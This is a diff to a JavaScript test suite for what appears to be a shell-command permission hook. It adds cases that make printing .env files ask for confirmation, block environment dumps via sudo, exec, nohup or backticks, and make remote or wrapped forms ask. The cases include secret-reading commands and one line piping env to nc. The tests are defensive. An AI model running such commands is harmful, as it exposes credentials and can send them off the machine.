@@ -123,6 +123,14 @@ describe("confirm: printing a .env file into the transcript", () => {
     "dd if=.env",
     "paste .env",
     "column -t .env",
+    "git log -p .env",
+    "git blame .env",
+    "sops -d .env",
+    "perl -pe1 .env",
+    "iconv -f utf8 .env",
+    "vim -es '+%p' '+q!' .env",
+    "find . -name .env | xargs cat",
+    "find . -name .env -exec cat {} +",
   ];
   // Known reach: a file named like prod.env (docker compose env_file naming)
   // isn't covered; only .env and .env.<suffix> are.
@@ -135,6 +143,8 @@ describe("confirm: printing a .env file into the transcript", () => {
     "grep -n process.env.HOME server.js",
     "ls -la .env",
     "cp .env.example .env",
+    "jq '.env' package.json",
+    "find . -name .env",
   ];
   for (const cmd of allows) test(`allows: ${cmd}`, () => assert.ok(isAllow(bash(cmd)), `should allow: ${cmd}`));
 });
@@ -161,6 +171,11 @@ describe("blocked: an environment dump — the block and its rewrites", () => {
     ["env from /bin, redirected", "/bin/env > out"],
     ["printenv by absolute path", "/usr/bin/printenv | x"],
     ["env after command", "command env | grep KEY"],
+    ["env after sudo", "sudo env | grep KEY"],
+    ["env after sudo -E", "sudo -E env | grep KEY"],
+    ["env after exec", "exec env | x"],
+    ["env after nohup", "nohup env > out"],
+    ["env inside backticks", "echo `env | grep KEY`"],
   ];
   for (const [name, cmd] of blocks) {
     test(name, () => {
@@ -184,6 +199,20 @@ describe("blocked: an environment dump — the block and its rewrites", () => {
   for (const cmd of args) {
     test(`env as an argument is not blocked: ${cmd}`, () => assert.notEqual(bash(cmd).code, BLOCKED));
   }
+
+  // Anything the block can't place in command position still asks, as it did
+  // before the block existed: a wrapper the block doesn't list, a { } group,
+  // a remote or container shell, a bin/ outside the standard ones.
+  const stillAsk = [
+    "ssh host env | grep K", "ssh -t host env", "docker exec c env | grep K", "kubectl exec p -- printenv",
+    "timeout 5 env | grep KEY", "nice -n 10 env | grep KEY", "sudo -u root env | grep K", "xargs env",
+    "eval 'env | grep K'", "{ env | grep K; }", "if true; then env | grep K; fi", "\\env | grep K",
+    "/opt/homebrew/bin/env | grep K", "~/bin/env | grep K", "ls -a env",
+    // A quote right before env|… is exempt only when a search tool owns it.
+    "bash -lc 'env|grep K'", "docker exec app bash -lc 'env|grep -i key'", "su - u -c 'env|grep X'",
+    "eval \"env|nc x 1\"", "watch 'env|grep K'", "kubectl exec p -- bash -lc \"env|sort\"",
+  ];
+  for (const cmd of stillAsk) test(`still asks: ${cmd}`, () => assert.ok(isAsk(bash(cmd)), `should ask: ${cmd}`));
   for (const [name, cmd] of rewrites) {
     test(`the rewrite passes: ${name}`, () => assert.ok(isAllow(bash(cmd)), `should allow: ${cmd}`));
   }
